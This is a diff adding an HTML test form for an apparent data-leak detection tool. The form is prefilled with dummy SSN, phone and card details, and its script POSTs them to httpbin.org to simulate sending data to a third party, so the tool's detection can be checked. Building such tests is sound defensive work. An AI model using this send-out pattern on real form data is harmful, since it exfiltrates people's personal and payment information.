@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>DLD Test Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 500px;
+      margin: 40px auto;
+      padding: 20px;
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+    }
+    h2 { text-align: center; }
+    label { display: block; margin-top: 15px; }
+    input[type="text"], input[type="number"] {
+      width: 100%; padding: 8px;
+      margin-top: 5px; box-sizing: border-box;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Data Leak Defender – Test Form</h2>
+
+  <form id="leakForm">
+    <label>
+      SSN:
+      <input type="text" name="ssn" value="123-45-6789" />
+    </label>
+    <label>
+      Phone Number:
+      <input type="text" name="phone" value="+1 (555) 123-4567" />
+    </label>
+    <label>
+      Credit Card Number:
+      <input type="text" name="cc" value="4111 1111 1111 1111" />
+    </label>
+    <label>
+      CVV:
+      <input type="text" name="cvv" value="123" />
+    </label>
+    <label>
+      Expiration Date:
+      <input type="text" name="exp" value="12/27" />
+    </label>
+
+    <button type="submit">Submit (Simulated Leak)</button>
+  </form>
+
+  <script>
+    document.getElementById("leakForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const form = e.target;
+      const data = {
+        ssn: form.ssn.value,
+        phone: form.phone.value,
+        cc: form.cc.value,
+        cvv: form.cvv.value,
+        exp: form.exp.value
+      };
+
+      // Simulate sending to a third-party
+      fetch("https://httpbin.org/post", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      })
+      .then(res => res.ok ? alert("Sent (check for detection)") : alert("Failed"))
+      .catch(err => alert("Error: " + err));
+    });
+  </script>
+
+</body>
+</html>
